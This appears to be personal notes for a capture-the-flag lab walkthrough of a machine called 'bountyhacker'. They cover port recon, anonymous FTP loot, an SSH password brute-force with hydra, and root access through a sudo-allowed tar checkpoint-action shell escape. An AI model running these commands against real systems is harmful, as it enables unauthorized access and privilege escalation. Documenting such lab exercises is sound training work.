# recon
- 21/tcp open  ftp
  - ftp-anon: Anonymous FTP login allowed (FTP code 230)
  - 2 files:
    - locks.txt
      - **wordlist**? I think so
    - task.txt
      - just a to do list from **Lin**
- 22/tcp open  ssh
- 80/tcp open  http
  - Apache/2.4.18 (Ubuntu)
  - gobuster!!
    - /images (Status: 301)
    - /index.html (Status: 200)


# foothold
```console
$ hydra -f -l lin -P locks.txt $IP -t 64 ssh
```

# root
```console
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
https://gtfobins.github.io/gtfobins/tar/
```console
lin@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cat /root/root.txt
```